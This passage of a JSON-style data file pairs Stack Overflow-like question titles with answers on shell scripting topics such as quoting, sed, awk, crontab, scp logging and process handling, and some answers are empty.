    "Why am I getting a 'unary operator expected' error?": "You need quotes around $THEME here:\nif [ $THEME == '' ]\nOtherwise, when you don't specify a theme, $THEME expands to nothing, and the shell sees this syntax error:\nif [ == '' ]\nWith quotes added, like so:\nif [ \"$THEME\" == '' ]\nthe expansion of an empty $THEMEyields this valid comparison instead:\nif [ \"\" == '' ]\nThis capacity for runtime syntax errors can be surprising to those whose background is in more traditional programming languages, but command shells (at least those in the Bourne tradition) parse code somewhat differently. In many contexts, shell parameters behave more like macros than variables; this behavior provides flexibility, but also creates traps for the unwary.\nSince you tagged this question bash, it's worth noting that there is no word-splitting performed on the result of parameter expansion inside the \"new\" test syntax available in bash (and ksh/zsh), namely [[...]]. So you can also do this:\nif [[ $THEME == '' ]]\nThe places you can get away without quotes are listed here. But it's a fine habit to always quote parameter expansions anyway except when you explicitly want word-splitting (and even then, look to see if arrays will solve your problem instead).\nIt would be more idiomatic to use the -z test operator instead of equality with the empty string:\nif [ -z \"$THEME\" ]\nOf course, [[...]] doesn't require any quotes for this version, either:\nif [[ -z $THEME ]]\nBut [[...]] is not part of the POSIX standard; for that matter, neither is ==. So if you care about strict compatibility with other POSIX shells, stick to the quoting solution and use either -z or a single =.",
    "Wait for Android emulator to be running before next shell command?": "",
    "paste without temporary files in Unix": "You do not need temp files under bash, try this:\npaste <(./progA) <(./progB)\nSee \"Process Substitution\" in the Bash manual.",
    "How to execute external shell commands from laravel controller?": "",
    "Bash command that prints a message on stderr": "No one has mentioned this but you can also do this:\necho An error message > /dev/stderr\nIt's possibly more readable than >&2 but I guess that depends who you are.",
    "How to hide passwords in Jenkins console output?": "",
    "How can I output null-terminated strings in Awk?": "There are three alternatives:\nSetting ORS to ASCII zero: Other solutions have awk -vORS=$'\\0' but:\nThe $'\\0' is a construct specific to some shells (bash,zsh).\nSo: this command awk -vORS=$'\\0' will not work in most older shells.\nThere is the option to write it as: awk 'BEGIN { ORS = \"\\0\" } ; { print $0 }', but that will not work with most awk versions.\nPrinting (printf) with character \\0: awk '{printf( \"%s\\0\", $0)}'\nPrinting directly ASCII 0: awk '{ printf( \"%s%c\", $0, 0 )}'\nTesting all alternatives with this code:\n#!/bin/bash\n\ntest1(){   # '{printf( \"%s%c\",$0,0)}'|\n    a='awk,mawk,original-awk,busybox awk'\n    IFS=',' read -ra line <<<\"$a\"\n    for i in \"${line[@]}\"; do\n        printf \"%14.12s %40s\" \"$i\" \"$1\"\n        echo -ne \"a\\nb\\nc\\n\" |\n        $i \"$1\"|\n        od -cAn;\n    done\n}\n\n#test1 '{print}'\ntest1 'BEGIN { ORS = \"\\0\" } ; { print $0 }'\ntest1 '{ printf \"%s\\0\", $0}'\ntest1 '{ printf( \"%s%c\", $0, 0 )}'\nWe get this results:\n            awk      BEGIN { ORS = \"\\0\" } ; { print $0 }   a  \\0   b  \\0   c  \\0\n           mawk      BEGIN { ORS = \"\\0\" } ; { print $0 }   a   b   c\n   original-awk      BEGIN { ORS = \"\\0\" } ; { print $0 }   a   b   c\n    busybox awk      BEGIN { ORS = \"\\0\" } ; { print $0 }   a   b   c\n            awk                     { printf \"%s\\0\", $0}   a  \\0   b  \\0   c  \\0\n           mawk                     { printf \"%s\\0\", $0}   a   b   c\n   original-awk                     { printf \"%s\\0\", $0}   a   b   c\n    busybox awk                     { printf \"%s\\0\", $0}   a   b   c\n            awk               { printf( \"%s%c\", $0, 0 )}   a  \\0   b  \\0   c  \\0\n           mawk               { printf( \"%s%c\", $0, 0 )}   a  \\0   b  \\0   c  \\0\n   original-awk               { printf( \"%s%c\", $0, 0 )}   a  \\0   b  \\0   c  \\0\n    busybox awk               { printf( \"%s%c\", $0, 0 )}   a   b   c\nAs it can be seen above, the first two solutions work only in GNU AWK.\nThe most portable is the third solution: '{ printf( \"%s%c\", $0, 0 )}'.\nNo solution work correctly in \"busybox awk\".\nThe versions used for this tests were:\n          awk> GNU Awk 4.0.1\n         mawk> mawk 1.3.3 Nov 1996, Copyright (C) Michael D. Brennan\n original-awk> awk version 20110810\n      busybox> BusyBox v1.20.2 (Debian 1:1.20.0-7) multi-call binary.",
    "How do you start Unix screen command with a command?": "Your program is being run (well, except the cd), it's just that it's being run without a parent shell, so as soon as it completes, it exits and you're done.\nYou could do:\nscreen -t \"autotest\" 2 bash -c 'cd ~/project/contactdb ; autotest'\nSpawns two shells, but life will probably go on.",
    "How to best capture and log scp output?": "scp prints its progress bar to the terminal using control codes. It will detect if you redirect output and thus omit the progress bar.\nYou can get around that by tricking scp into thinking it runs in a terminal using the \"script\" command which is installed on most distros by default:\nscript -q -c \"scp server:/file /tmp/\" > /tmp/test.txt\nThe content of test.txt will be:\nfile    0%    0     0.0KB/s   --:-- ETA\nfile   18%   11MB  11.2MB/s   00:04 ETA\nfile   36%   22MB  11.2MB/s   00:03 ETA\nfile   54%   34MB  11.2MB/s   00:02 ETA\nfile   73%   45MB  11.2MB/s   00:01 ETA\nfile   91%   56MB  11.2MB/s   00:00 ETA\nfile  100%   61MB  10.2MB/s   00:06\n...which is probably what you want.\nI stumbled over this problem while redirecting the output of an interactive script into a log file. Not having the results in the log wasn't a problem as you can always evaluate exit codes. But I really wanted the interactive user to see the progress bar. This answer solves both problems.",
    "Checking for installed packages and if not found install": "Try the following code :\nif ! rpm -qa | grep -qw glibc-static; then\n    yum install glibc-static\nfi\nor shorter :\nrpm -qa | grep -qw glibc-static || yum install glibc-static\nFor debian likes :\ndpkg -l | grep -qw package || apt-get install package\nFor archlinux :\npacman -Qq | grep -qw package || pacman -S package",
    "How to remove XML tags from Unix command line?": "If your file looks just like that, then sed can help you:\nsed -e 's/<[^>]*>//g' file.xml\nOf course you should not use regular expressions for parsing XML because it's hard.",
    "How to capture the output of curl to variable in bash [duplicate]": "You have two options (see this StackOverflow answer here):\nPreferred: Surround the invocation in $()\nSurround the invocation in back ticks\nNOTE: back ticks are legacy, the former method is preferred.\noutput=$(curl -I http://google.com | head -n 1| cut -d $' ' -f2)\necho \"$output\";\n\noutput=`curl -I http://google.com | head -n 1| cut -d $' ' -f2`\necho \"$output\";",
    "a bash script to change postgresql user password": "Easier if you use sudo:\nsudo -u postgres psql -U postgres -d postgres -c \"alter user postgres with password 'password';\"\nbut it's possible with su too, this should work:\nsu - postgres -c \"psql -U postgres -d postgres -c \\\"alter user postgres with password 'password';\\\"\"\nI've used outer double quotes and escaped the inner double quotes so they pass through as part of a single call argument to su and get unescaped by the shell so the actual query text gets passed as a single arg to psql including the single-quoted password.\nOne of the reasons sudo is easier for this is that it uses a smarter way of executing the subprocess instead of running a second shell instance to do it. You need one less layer of shell metacharacter escaping.",
    "Load unpacked Chrome extension programmatically": "Yes, although only temporarily *:\nchromium --load-extension=path/to/extension\nIf you want to load multiple extensions, just separate the path by a comma:\nchromium --load-extension=path/to/extension,path/to/another/extension\nReplace chromium with chrome.exe (or whatever is used to start your Chrome/Chromium browser).\n* When you close the browser, and starts it again without the command line argument, then the extension will disappear from the list of installed extensions.",
    "How can I parse long-form arguments in shell?": "I've done something like this:\n_setArgs(){\n  while [ \"${1:-}\" != \"\" ]; do\n    case \"$1\" in\n      \"-c\" | \"--configFile\")\n        shift\n        configFile=$1\n        ;;\n      \"-f\" | \"--forceUpdate\")\n        forceUpdate=true\n        ;;\n      \"-r\" | \"--forceRetry\")\n        forceRetry=true\n        ;;\n    esac\n    shift\n  done\n}\nAs you can see, this supports both the single-character and the longer options nicely. It allows for values to be associated with each argument, as in the case of --configFile. It's also quite extensible, with no artificial limitations as to what options can be configured, etc.\nAs included above, the \"${1:-}\" prevents an \"unbound variable\" error when running in bash \"strict\" mode (set -euo pipefail).",
    "git-upload-pack: command not found": "This is connected to this issue:\nhttps://serverfault.com/questions/130834/svnssh-getting-bash-to-load-my-path-over-ssh\nSsh is not loading your environment by default when sending a command without going to interactive mode.\ngood solution is the one with .ssh/environment file:\nin /etc/ssh/sshd_config add:\nPermitUserEnvironment yes\nThen just create .ssh/ directory and dump envronment to .ssh/enviroment:\ncd ~/\nmkdir .ssh\nenv > .ssh/environment\nRestart SSH\n/etc/init.d/sshd restart\nNow when you do this from your local machine:\nssh you@server.com  \"which git-upload-pack\"\nyou s'd get\n/usr/local/bin/git-upload-pack\nand git clone s'd work.",
    "Replacing one char with many chars with using tr": "tr just can translate/delete characters.\nTry something like this:\n echo \"a~b\" | sed 's/~/==/g'",
    "How to sort a text file according to character code or ASCII code value?": "You've frobbed the wrong program.\necho \"$string\" | LC_ALL=C sort\nUsing $LC_COLLATE is also acceptable.",
    "Using sed to replace tab with spaces": "In sed replacement is not supposed to be a regex, so use:\nsed -i.bak $'s/\\t/    /g' filename\nOn gnu-sed even this will work:\nsed -i.bak 's/\\t/    /g' filename",
    "Define alias that references other aliases": "To reuse alias in another alias use:\nfoobar='foo;bar'\nHowever I would suggest you to consider using shell function to get better control over this.",
    "How to run interactive shell command inside node.js?": "This works great for me:\nconst { spawn } = require('child_process')\nconst shell = spawn('sh',[], { stdio: 'inherit' })\nshell.on('close',(code)=>{console.log('[shell] terminated :',code)})",
    "How to make shell scripts robust to source being changed as they run": "Very slight addition to the other answers:\n#!/bin/sh\n{\n    # Your stuff goes here\n    exit\n}\nThe exit at the end is important. Otherwise, the script file might still be accessed at the end to see if there are any more lines to interpret.\nThis question was later reposted here: Can a shell script indicate that its lines be loaded into memory initially?",
    "Execute Shell Commands from Program running in WINE": "With newer Wine versions (tested with Wine 1.7.38), you can run a Linux program from within Wine in the following way (here to launch gedit, as an example):\nwineconsole cmd\n...and from that wine console:\nstart /unix /usr/bin/gedit\nIf you want to launch a Linux program directly from within a Windows-application, the following line did work for me:\ncmd /c start /unix /usr/bin/gedit\nTo test this, you can call directly on your Linux console this:\nwine cmd /c start /unix /usr/bin/gedit\nOne important thing to Note: the program you want to start needs to have the executable bit set, otherwise calling it from Wine will fail!",
    "Why does running \"echo $-\" output \"himBH\" on the bash shell?": "It shows your Builtin Set Flags. man bash then look for SHELL BUILTIN COMMANDS and then look for the set subsection. You will find the meanings of all those flags:\nh: Remember the location of commands as they are looked up for execution.  This is enabled by default.\ni: interactive\nm: Monitor mode.  Job control is enabled\nB: The shell performs brace expansion (see Brace Expansion above).  This is on by default\nH: Enable !  style history substitution.  This option is on by default when the shell is interactive.",
    "basename with spaces in a bash script?": "In the case where the assignment is a single command substitution you do not need to quote the command substitution. The shell does not perform word splitting for variable assignments.\nMYBASENAME=$(basename \"$1\")\nis all it takes. You should get into the habit of using $() instead of backticks because $() nests more easily (it's POSIX, btw., and all modern shells support it.)\nPS: You should try to not write bash scripts. Try writing shell scripts. The difference being the absence of bashisms, zshisms, etc. Just like for C, portability is a desired feature of scripts, especially if it can be attained easily. Your script does not use any bashisms, so I'd write #!/bin/sh instead. For the nit pickers: Yes, I know, old SunOS and Solaris /bin/sh do not understand $() but the /usr/xpg4/bin/sh is a POSIX shell.",
    "How do I get colorized query output and shell in MongoDB?": "Check out this shell extension I made called Mongo-Hacker that has various enhancements:\nMongo Hacker Website\nCode (GitHub)",
    "How is % (percent sign) special in crontab?": "The actual problem of your crontab line is not the $() or the backquotes. The problem is the percent sign %. It has a special meaning in crontabs.\nFrom the manpage:\n...\nPercent-signs (%) in the command, unless escaped with backslash (\\), \nwill be changed into newline characters, and all data after the \nfirst % will be sent to the command  as standard input.\n...\nIf you escape the percent sign with \\ it should work as expected:\n* * * * * echo $(date +\\%F) >> /tmp/date.txt\nor\n* * * * * echo `date +\\%F` >> /tmp/date2.txt\nboth work on my site.",
    "Is there a good way to detect a stale NFS mount": "A colleague of mine ran into your script. This doesn't avoid a \"brute force\" approach, but if I may in Bash:\nwhile read _ _ mount _; do \n  read -t1 < <(stat -t \"$mount\") || echo \"$mount timeout\"; \ndone < <(mount -t nfs)\nmount can list NFS mounts directly. read -t (a shell builtin) can time out a command. stat -t (terse output) still hangs like an ls*. ls yields unnecessary output, risks false positives on huge/slow directory listings, and requires permissions to access - which would also trigger a false positive if it doesn't have them.\nwhile read _ _ mount _; do \n  read -t1 < <(stat -t \"$mount\") || lsof -b 2>/dev/null|grep \"$mount\"; \ndone < <(mount -t nfs)\nWe're using it with lsof -b (non-blocking, so it won't hang too) in order to determine the source of the hangs.\nThanks for the pointer!\ntest -d (a shell builtin) would work instead of stat (a standard external) as well, but read -t returns success only if it doesn't time out and reads a line of input. Since test -d doesn't use stdout, a (( $? > 128 )) errorlevel check on it would be necessary - not worth the legibility hit, IMO.",
    "Detect empty command": "Here's a funny, very simple possibility: it uses the \\# escape sequence of PS1 together with parameter expansions (and the way Bash expands its prompt).\nThe escape sequence \\# expands to the command number of the command to be executed. This is incremented each time a command has actually been executed. Try it:\n$ PS1='\\# $ '\n2 $ echo hello\nhello\n3 $ # this is a comment\n3 $\n3 $    echo hello\nhello\n4 $\nNow, each time a prompt is to be displayed, Bash first expands the escape sequences found in PS1, then (provided the shell option promptvars is set, which is the default), this string is expanded via parameter expansion, command substitution, arithmetic expansion, and quote removal.\nThe trick is then to have an array that will have the k-th field set (to the empty string) whenever the (k-1)-th command is executed. Then, using appropriate parameter expansions, we'll be able to detect when these fields are set and to display the return code of the previous command if the field isn't set. If you want to call this array __cmdnbary, just do:\nPS1='\\n${__cmdnbary[\\#]-$? }${__cmdnbary[\\#]=}\\$ '\nLook:\n$ PS1='\\n${__cmdnbary[\\#]-$? }${__cmdnbary[\\#]=}\\$ '\n\n0 $ [ 2 = 3 ]\n\n1 $ \n\n$ # it seems that it works\n\n$     echo \"it works\"\nit works\n\n0 $\nTo qualify for the shortest answer challenge:\nPS1='\\n${a[\\#]-$? }${a[\\#]=}$ '\nthat's 31 characters.\nDon't use this, of course, as a is a too trivial name; also, \\$ might be better than $.\nSeems you don't like that the initial prompt is 0 $; you can very easily modify this by initializing the array __cmdnbary appropriately: you'll put this somewhere in your configuration file:\n__cmdnbary=( '' '' ) # Initialize the field 1!\nPS1='\\n${__cmdnbary[\\#]-$? }${__cmdnbary[\\#]=}\\$ '",
    "libclntsh.so.11.1: cannot open shared object file.": "Possibly you want to specify PATH \u2014 and also ORACLE_HOME and LD_LIBRARY_PATH \u2014 so that cron(1) knows where to find binaries.\nRead \"5 Crontab environment\" here.",
    "How to escape the bang (!) character in Linux bash shell?": "Try this:\n echo 'Text text text!'\nor\n echo \"Text text text\"'!'\nor\n echo -e \"Text text text\\x21\"",
    "How to call Makefile located in other directory?": "GNU make accepts many options, notably -C to change directory before running, and -f for giving the Makefile to follow.\nCombine them appropriately.\nConsider using remake to ease debugging (notably with -x) of Makefile related issues. With GNU make version 4 or better, also use make --trace...\nYou could have your own executable shell script (e.g. in your $HOME/bin/ which would be in your $PATH) which uses both cd and make).\nYou could consider other build automation tools (ninja perhaps)\nRead also P.Miller's paper Recursive Make considered harmful",
    "How to run .sh file on Windows 7 through Cygwin?": "You can run it as:\nbash run.sh\nOr else:\nchmod +x run.sh\n./run.sh",
    "Changing the bash script sent to sbatch in slurm during run a bad idea?": "When sbatch is run, Slurm copies the submission script to its internal database ; you can convince yourself with the following experiment:\n$ cat submit.sh\n#!/bin/bash\n#SBATCH  --hold\necho helloworld\nThe --hold is there to make sure the job does not start. Submit it :\n$ sbatch submit.sh\nThen modify the submission script:\n$ sed -i 's/hello/bye/' submit.sh\n$ cat submit.sh\n#!/bin/bash\n#SBATCH  --hold\necho byeworld\nand now use control show job to see the script Slurm is planning to run:\n$ scontrol show -ddd job YOURJOBID\nJobId=******* JobName=submit.sh\n[...]\nBatchScript=\n   #!/bin/bash\n   #SBATCH  --hold\n   echo helloworld\n[...]\nIt hasn't changed although the original script has.\n[EDIT] Recent versions of Slurm use scontrol write batch_script <job_id> [<optional_filename>] rather than scontrol show -dd job to write the submission script to a file named <optional_filename>. The optional filename can be - to display the script to the screen rather than save it to a file.",
    "Check if directory does not exist [duplicate]": "The issue is that you have two [ symbols. You only need one:\n          if [ ! -d $i/$arc ];then\nAn additional point: some shell versions don't handle the ; being right next to the closing bracket. Thus, I'd suggest formatting like this for best compatibility:\n          if [ ! -d $i/$arc ] ; then\nEdit: since the above didn't help you, more thoughts:\nIt's also entirely possible that your script, running as you, can't actually read the contents of the $i directory and thus the test will always fail (or succeed, actually). But, when you create the directory as root via sudo, it already exists.\n[It would also be more efficient to run the entire script under sudo rather than just certain pieces of it.]",
    "How to remove certain directories from lcov code coverage report?": "lcov has an option --remove to ignore coverage data for specified files.\n--remove tracefile pattern\nRemove data from tracefile.\nUse this switch if you want to remove coverage data for a par- ticular set of files from a tracefile. Additional command line parameters will be interpreted as shell wildcard patterns (note that they may need to be escaped accordingly to prevent the shell from expanding them first). Every file entry in tracefile which matches at least one of those patterns will be removed.\nThe result of the remove operation will be written to stdout or the tracefile specified with -o.\nOnly one of -z, -c, -a, -e, -r, -l, --diff or --summary may be specified at a time.\nYou can do something like; quoting from the hyper-link below\nlcov --remove /tmp/libreoffice_total.info -o /tmp/libreoffice_filtered.info \\\n    '/usr/include/*' \\\n    '/usr/lib/*' \\\n    '/usr/local/src/libreoffice/*/UnpackedTarball/*' \\\n    '/usr/local/src/libreoffice/workdir/*' \\\n    '/usr/local/src/libreoffice/instdir/*' \\\n    '/usr/local/src/libreoffice/external/*' \\\nRefer to this page for more documentation.",
    "Custom (interactive) shell with Python [closed]": "The cmd module in the standard library could be a start -- if you have any trouble using it, please post more specific questions (ideally with some toy example showing what you're trying to achieve and what you're getting instead!).",
    "Get xmllint to output xpath results \\n-separated, for attribute selector": "You can try:\n$ xmllint --shell inputfile <<< 'cat /config/*/@*'\nYou might need to grep the output, though, so as to filter the undesired lines.",
    "Git post-commit hook as a background task": "Here's how it works for me:\n#!/bin/sh\n# I am a post-commit hook\nnohup /usr/local/bin/my_script &>/dev/null &",
    "When are bash variables exported to subshells and/or accessible by scripts?": "(...) runs ... in a separate environment, something most easily achieved (and implemented in bash, dash, and most other POSIX-y shells) using a subshell -- which is to say, a child created by fork()ing the old shell, but not calling any execv-family function. Thus, the entire in-memory state of the parent is duplicated, including non-exported shell variables. And for a subshell, this is precisely what you typically want: just a copy of the parent shell's process image, not replaced with a new executable image and thus keeping all its state in place.\nConsider (. shell-library.bash; function-from-that-library \"$preexisting_non_exported_variable\") as an example: Because of the parens it fork()s a subshell, but it then sources the contents of shell-library.bash directly inside that shell, without replacing the shell interpreter created by that fork() with a separate executable. This means that function-from-that-library can see non-exported functions and variables from the parent shell (which it couldn't if it were execve()'d), and is a bit faster to start up (since it doesn't need to link, load, and otherwise initialize a new shell interpreter as happens during execve() operation); but also that changes it makes to in-memory state, shell configuration, and process attributes like working directory won't modify the parent interpreter that called it (as would be the case if there were no subshell and it weren't fork()'d), so the parent shell is protected from having configuration changes made by the library that could modify its later operation.\n./other-script, by contrast, runs other-script as a completely separate executable; it does not retain non-exported variables after the child shell (which is not a subshell!) has been invoked. This works as follows:\nThe shell calls fork() to create a child. At this point in time, the child still has even non-exported variable state copied.\nThe child honors any redirections (if it was ./other-script >>log.out, the child would open(\"log.out\", O_APPEND) and then fdup() the descriptor over to 1, overwriting stdout).\nThe child calls execv(\"./other-script\", {\"./other-script\", NULL}), instructing the operating system to replace it with a new instance of other-script. After this call succeeds, the process running under the child's PID is an entirely new program, and only exported variables survive.",
    "Redirecting/storing output of shell into GDB variable?": "theres 2 ways:\nthe older way:\n(gdb) shell echo set \\$x=\\\"$(uname -m)\\\" >/tmp/foo.gdb\n(gdb) source /tmp/foo.gdb\nnewer with python:\n(gdb) python gdb.execute(\"set $y=\\\"\" + os.uname()[4] + \"\\\"\")",
    "docker: unrecognized service": "Seems like WSL cannot connect to the docker daemon running through Docker for Windows, probably because it is not exposed or is not running.\nWSL1\nIn case you are using WSL 1, you can expose the docker daemon through this option in Docker for Windows: I recommend this article for a detailed guide.\nI would highly recommend running docker within WSL 2 instead, since it provides faster boot times and allows docker to use CPU/RAM dynamically instead of you having to preallocate it.\nWSL2\nIn case you are using WSL 2, you will have to enable the WSL 2 back-end for docker through Docker for Windows. The docker team has an extensive guide on this here.",
    "What should interactive shells do in orphaned process groups?": "Here's what strace says is happening:\n--- SIGTTIN (Stopped (tty input)) @ 0 (0) ---\nrt_sigaction(SIGTTIN, {SIG_IGN, [], SA_RESTORER, 0x7fd5f6989d80}, {SIG_DFL, [], SA_RESTORER, 0x7fd5f6989d80}, 8) = 0\nioctl(255, TIOCGPGRP, [9954])           = 0\nrt_sigaction(SIGTTIN, {SIG_DFL, [], SA_RESTORER, 0x7fd5f6989d80}, {SIG_IGN, [], SA_RESTORER, 0x7fd5f6989d80}, 8) = 0\nkill(0, SIGTTIN)                        = 0\n--- SIGTTIN (Stopped (tty input)) @ 0 (0) ---\nrt_sigaction(SIGTTIN, {SIG_IGN, [], SA_RESTORER, 0x7fd5f6989d80}, {SIG_DFL, [], SA_RESTORER, 0x7fd5f6989d80}, 8) = 0\nioctl(255, TIOCGPGRP, [9954])           = 0\nrt_sigaction(SIGTTIN, {SIG_DFL, [], SA_RESTORER, 0x7fd5f6989d80}, {SIG_IGN, [], SA_RESTORER, 0x7fd5f6989d80}, 8) = 0\nkill(0, SIGTTIN)                        = 0\n[repeat...]\nand here is why, from jobs.c, bash 4.2:\n  while ((terminal_pgrp = tcgetpgrp (shell_tty)) != -1)\n    {\n      if (shell_pgrp != terminal_pgrp)\n        {\n          SigHandler *ottin;\n\n          ottin = set_signal_handler(SIGTTIN, SIG_DFL);\n          kill (0, SIGTTIN);\n          set_signal_handler (SIGTTIN, ottin);\n          continue;\n        } \n      break;\n    } \nConcerning what to do about it...well that's beyond my ability. But, I thought this was useful information, and a bit much for a comment.",
    "Portable shell solution to check if PID is zombied": "Hopefully POSIX compliant. Tested with dash. To use it, save it with your favorite editor, make it executable (chmod 755 foo.sh), and run it with a PID argument.\nOf course you can adapt it as needed.\n#!/bin/sh\npid=\"$1\";\npsout=$(ps -o s= -p \"$pid\");\npattern='[SRDTWX]';\n\ncase \"$psout\" in \n    $pattern) echo \"Not a zombie\";;\n    Z) echo \"Zombie found\";;\n    *) echo \"Incorrect input\";; \nesac",
    "-bash: /usr/bin/virtualenvwrapper.sh: No such file or directory": "on ubuntu 12.04 LTS, installing through pip, it is installed to\n/usr/local/bin/virtualenvwrapper.sh\nAnd if you are using Ubuntu 16.04 or later, it is installed to\n~/.local/bin/virtualenvwrapper.sh",
    "shell script to find file name from its path": "Try:\npath=\"/var/www/html/test.php\"\nname=$(basename \"$path\" \".php\")\necho \"$name\"\nThe quotes are only there to prevent problems when $path contains spaces.",
    "MySQL Command not Found [MAMP]": "A simple way is to just run\nsudo ln -s /Applications/MAMP/Library/bin/mysql /usr/local/bin/mysql\nWhat this does is add a symbolic link for the mysql binary from MAMP into your executable path \u2013 in this case, within /usr/local/bin/\n\nWarning: If you\u2019ve installed MySQL manually as well, this may interfere with that installation, so don\u2019t do this if you have!",
    "Return value from a Java code": "The return value of a Java application is not the return value of it's main method, because a Java application doesn't necessarily end when it's main method has finished execution.\nInstead the JVM ends when no more non-daemon threads are running or when System.exit() is called.\nAnd System.exit() is also the only way to specify the return value: the argument passed to System.exit() will be used as the return value of the JVM process on most OS.\nSo ending your main() method with this:\nSystem.exit(0);\nwill ensure two things:\nthat your Java application really exits when the end of main is reached and\nthat the return value of the JVM process is 0",
    "Replacing Control Character in sed": "Try:\nsed 's/^A/foo/g' file\nUse Ctrl+V+A to create the ^A sequence in the above command.",
    "running bash pipe commands in background with & ampersand": "You should put the & inside the (), if you want to run all the jobs in parallel in the background.\ntime for i in `ls /tmp/chunk*`; do\n  (cat $i | tr ' ' '\\n' | sort | uniq > /tmp/line${i:10} &)\ndone",
    "Generating permutations using bash": "I know I am a little late to the game but why not brace expansion?\nFor example:\necho {a..z}{0..9}\nOutputs:\na0 a1 a2 a3 a4 a5 a6 a7 a8 a9 b0 b1 b2 b3 b4 b5 b6 b7 b8 b9 c0 c1 c2 c3 c4 c5 c6 c7 c8 c9 d0 d1 d2 d3 d4 d5 d6 d7 d8 d9 e0 e1 e2 e3 e4 e5 e6 e7 e8 e9 f0 f1 f2 f3 f4 f5 f6 f7 f8 f9 g0 g1 g2 g3 g4 g5 g6 g7 g8 g9 h0 h1 h2 h3 h4 h5 h6 h7 h8 h9 i0 i1 i2 i3 i4 i5 i6 i7 i8 i9 j0 j1 j2 j3 j4 j5 j6 j7 j8 j9 k0 k1 k2 k3 k4 k5 k6 k7 k8 k9 l0 l1 l2 l3 l4 l5 l6 l7 l8 l9 m0 m1 m2 m3 m4 m5 m6 m7 m8 m9 n0 n1 n2 n3 n4 n5 n6 n7 n8 n9 o0 o1 o2 o3 o4 o5 o6 o7 o8 o9 p0 p1 p2 p3 p4 p5 p6 p7 p8 p9 q0 q1 q2 q3 q4 q5 q6 q7 q8 q9 r0 r1 r2 r3 r4 r5 r6 r7 r8 r9 s0 s1 s2 s3 s4 s5 s6 s7 s8 s9 t0 t1 t2 t3 t4 t5 t6 t7 t8 t9 u0 u1 u2 u3 u4 u5 u6 u7 u8 u9 v0 v1 v2 v3 v4 v5 v6 v7 v8 v9 w0 w1 w2 w3 w4 w5 w6 w7 w8 w9 x0 x1 x2 x3 x4 x5 x6 x7 x8 x9 y0 y1 y2 y3 y4 y5 y6 y7 y8 y9 z0 z1 z2 z3 z4 z5 z6 z7 z8 z9\nAnother useful example:\nfor X in {a..z}{a..z}{0..9}{0..9}{0..9}\n    do echo $X;\ndone",
    "Compare variable with integer in shell? [duplicate]": "Well that is quite simple:\nif [ \"$counter\" -gt 5 ]\nthen\n    echo \"something\"\nfi",
    "Change extension of file using shell script": "Bash can do all of the heavy lifting such as extracting the extension and tagging on a new one. For example:\nfor file in $1/*.dat ; do mv \"$file\" \"${file%.*}.txt\" ; done",
    "Spark shell command lines": "In this context you can assume that Spark shell is just a normal Scala REPL so the same rules apply. You can get a list of the available commands using :help.\nWelcome to\n      ____              __\n     / __/__  ___ _____/ /__\n    _\\ \\/ _ \\/ _ `/ __/  '_/\n   /___/ .__/\\_,_/_/ /_/\\_\\   version 2.3.0\n      /_/\n\nUsing Scala version 2.11.8 (OpenJDK 64-Bit Server VM, Java 1.8.0_151)\nType in expressions to have them evaluated.\nType :help for more information.\n\nscala> :help\nAll commands can be abbreviated, e.g., :he instead of :help.\n:edit <id>|<line>        edit history\n:help [command]          print this summary or command-specific help\n:history [num]           show the history (optional num is commands to show)\n:h? <string>             search the history\n:imports [name name ...] show import history, identifying sources of names\n:implicits [-v]          show the implicits in scope\n:javap <path|class>      disassemble a file or class name\n:line <id>|<line>        place line(s) at the end of history\n:load <path>             interpret lines in a file\n:paste [-raw] [path]     enter paste mode or paste a file\n:power                   enable power user mode\n:quit                    exit the interpreter\n:replay [options]        reset the repl and replay all previous commands\n:require <path>          add a jar to the classpath\n:reset [options]         reset the repl to its initial state, forgetting all session entries\n:save <path>             save replayable session to a file\n:sh <command line>       run a shell command (result is implicitly => List[String])\n:settings <options>      update compiler options, if possible; see reset\n:silent                  disable/enable automatic printing of results\n:type [-v] <expr>        display the type of an expression without evaluating it\n:kind [-v] <expr>        display the kind of expression's type\n:warnings                show the suppressed warnings from the most recent line which had any\nAs you can see above you can invoke shell commands using :sh. For example:\nscala> :sh mkdir foobar\nres0: scala.tools.nsc.interpreter.ProcessResult = `mkdir foobar` (0 lines, exit 0)\n\nscala> :sh touch foobar/foo\nres1: scala.tools.nsc.interpreter.ProcessResult = `touch foobar/foo` (0 lines, exit 0)\n\nscala> :sh touch foobar/bar\nres2: scala.tools.nsc.interpreter.ProcessResult = `touch foobar/bar` (0 lines, exit 0)\n\nscala> :sh ls foobar\nres3: scala.tools.nsc.interpreter.ProcessResult = `ls foobar` (2 lines, exit 0)\n\nscala> res3.line foreach println\nline   lines\n\nscala> res3.lines foreach println\nbar\nfoo",
    "Editing plist file using shell script": "Also:\nplutil -replace BundleIsRelocatable -bool false plistfilename.plist",
    "Convert .txt to .csv in shell": "Only sed and nothing else\nsed 's/ \\+/,/g' ifile.txt > ofile.csv\ncat ofile.csv\n1,4,22.0,3.3,2.3\n2,2,34.1,5.4,2.3\n3,2,33.0,34.0,2.3\n4,12,3.0,43.0,4.4",
    "Bash loop until a certain command stops failing": "In addition to the well-known while loop, POSIX provides an until loop that eliminates the need to negate the exit status of my_command.\n# To demonstrate\nmy_command () { read number; return $number; }\n\nuntil my_command; do\n    if [ $? -eq 5 ]; then\n        echo \"Error was 5\"\n    else\n        echo \"Error was not 5\"\n    fi\n    # potentially, other code follows...\ndone",
    "sshpass: command not found error": "you will need to install sshpass on the client server you are running your code in which is a tool that is not installed by default on most Linux distro\nif you are in Ubuntu use this command\napt-get install sshpass\non centOS/redhat use this install epel\nwget https://archives.fedoraproject.org/pub/archive/epel/6/x86_64/epel-release-6-8.noarch.rpm\nrpm -ivh epel-release-6-8.noarch.rpm\ninstall sshpass\nyum --enablerepo=epel -y install sshpass\nThanks",
    "How to find information inside a xml tag using grep?": "Since you already use grep -P, why don't you use its features?\ngrep -oP '(?<=<title>).*?(?=</title>)'\nIn the general case, XPath is the correct solution, but for toy scenarios, yes Virginia, it can be done.",
    "What does \"plus colon\" (\"+:\") mean in shell script expressions?": "In the \u201cplus colon\u201d ${...+:} expression, only the + has special meaning in the shell. The colon is just a string value in this case, so we could write that snippet as ${...+\":\"}. But, because it is also the first word in a shell command list, it becomes the command : which always returns true.\nDepending on the question if the variable has a value or not, the if statement becomes either if true false;  or if false; .\nLet's break it down:\nFor convenience, let's pretend the variable is called var, and consider the expression:\nif ${var+:} false; then ...\nIf the shell variable $var exists, the entire expression is replaced with :, if not, it returns an empty string.\nTherefore the entire expression ${var+:} false becomes either : false (returning true) or false (returning false).\nThis comes down to a test for existence, which can be true even if the variable has no value assigned.\nIt is very cryptic, but as it happens, is one of the few tests for the existence of a variable that actually works in most, if not all, shells of Bourne 